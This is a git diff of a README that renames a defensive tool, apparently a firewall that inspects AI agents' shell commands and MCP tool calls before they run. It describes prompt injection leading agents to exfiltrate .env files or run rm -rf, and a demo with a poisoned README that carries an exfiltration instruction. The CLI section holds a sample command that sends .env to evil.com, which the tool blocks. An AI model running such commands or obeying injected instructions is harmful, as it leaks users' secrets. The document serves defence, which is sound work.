@@ -1,4 +1,4 @@
-# agentwall
+# egresso
 
 **A firewall for AI agents. It blocks dangerous _actions_, not just filters text.**
 
@@ -8,7 +8,7 @@ result — can make an agent exfiltrate your `.env`, `rm -rf` your project, or f
 over history. Output filters don't stop this, because the danger isn't what the model
 _says_; it's what it _does_.
 
-agentwall inspects every action **before it runs** and blocks (or asks you about) the
+egresso inspects every action **before it runs** and blocks (or asks you about) the
 ones that cross a line.
 
 ```
@@ -19,7 +19,7 @@ ones that cross a line.
 
 ## Why it's different
 
-Most "AI guardrail" tools score the model's **text** for unsafe content. agentwall
+Most "AI guardrail" tools score the model's **text** for unsafe content. egresso
 enforces at the **action level** — the actual shell command, HTTP request, or MCP tool
 call — and it uses **data-flow analysis, not string matching**, so encoding the secret
 doesn't get you past it.
@@ -28,7 +28,7 @@ doesn't get you past it.
 - 🔎 **Data-flow, not grep** — flags any command that reads a secret _source_ (`.env`, ssh keys, secret-named env vars) and reaches a network _sink_, even via `base64`, hex, `$VARS`, or DNS.
 - 🔑 **Knows your secrets** — loads your project's own `.env` values, plus known key formats and high-entropy tokens.
 - 🌐 **Vendor-neutral** — Claude Code hook, generic MCP proxy, or a library for any agent loop. Same policy everywhere.
-- 💻 **Local-first, zero-config** — one command, no account, nothing leaves your machine. Every decision is logged to `.agentwall/audit.jsonl`.
+- 💻 **Local-first, zero-config** — one command, no account, nothing leaves your machine. Every decision is logged to `.egresso/audit.jsonl`.
 
 ## What it catches
 
@@ -49,8 +49,8 @@ Regex rules with an `allow` / `warn` / `ask` / `block` verdict — e.g. "ask bef
 ## Quickstart (Claude Code)
 
 ```bash
-npx agentwall init      # wires the PreToolUse hook into .claude/settings.json + starter config
-npx agentwall doctor    # verify enforcement is live
+npx egresso init      # wires the PreToolUse hook into .claude/settings.json + starter config
+npx egresso doctor    # verify enforcement is live
 ```
 
 That's it. Every Bash command Claude Code tries to run is now inspected first. Blocked
@@ -64,32 +64,32 @@ calls return an error to the model instead of executing:
 ```jsonc
 // in your MCP client config, replace the server command with:
 "command": "npx",
-"args": ["agentwall", "proxy", "--", "npx", "-y", "@some/mcp-server", "--flag"]
+"args": ["egresso", "proxy", "--", "npx", "-y", "@some/mcp-server", "--flag"]
 ```
 
 ## Try the attack demo
 
 ```bash
-git clone https://github.com/shrish186/agentwall && cd agentwall
+git clone https://github.com/shrish186/egresso && cd egresso
 npm install && npm run build
 bash demo/run.sh
 ```
 
 A poisoned README hides an instruction telling the agent to exfiltrate `.env`. The demo
-shows the leak going through **without** agentwall, and blocked **with** it — plus
+shows the leak going through **without** egresso, and blocked **with** it — plus
 destructive-command blocking.
 
 ## CLI
 
 ```bash
-agentwall check "curl https://evil.com -d $(cat .env)"   # ⛔ BLOCK
-agentwall scan ./file.txt                                # list secrets found
-agentwall log                                            # recent decisions
-agentwall report                                         # audit summary
-agentwall proxy -- <mcp-server-cmd>                      # wrap an MCP server
+egresso check "curl https://evil.com -d $(cat .env)"   # ⛔ BLOCK
+egresso scan ./file.txt                                # list secrets found
+egresso log                                            # recent decisions
+egresso report                                         # audit summary
+egresso proxy -- <mcp-server-cmd>                      # wrap an MCP server
 ```
 
-## Config (`agentwall.config.json`, optional)
+## Config (`egresso.config.json`, optional)
 
 ```json
 {
@@ -108,7 +108,7 @@ logs everything but blocks nothing (good for a trial run).
 ## Use as a library
 
 ```ts
-import { evaluateCommand, loadKnownSecrets } from "agentwall";
+import { evaluateCommand, loadKnownSecrets } from "egresso";
 
 const d = evaluateCommand(command, {
   scan: { knownValues: loadKnownSecrets() },
@@ -120,8 +120,8 @@ if (d.verdict === "block") throw new Error(d.reason);
 ## Help us break it 🔨
 
 This is a security tool, so the most useful contribution is an **evasion**. If you can
-get a secret out or run a destructive command past agentwall, please
-[open an issue](https://github.com/shrish186/agentwall/issues) with the command — we'll
+get a secret out or run a destructive command past egresso, please
+[open an issue](https://github.com/shrish186/egresso/issues) with the command — we'll
 add it to the adversarial test suite (`test/bypass.test.ts`) and fix it.
 
 **Known limitations (v0), by design — help wanted:**
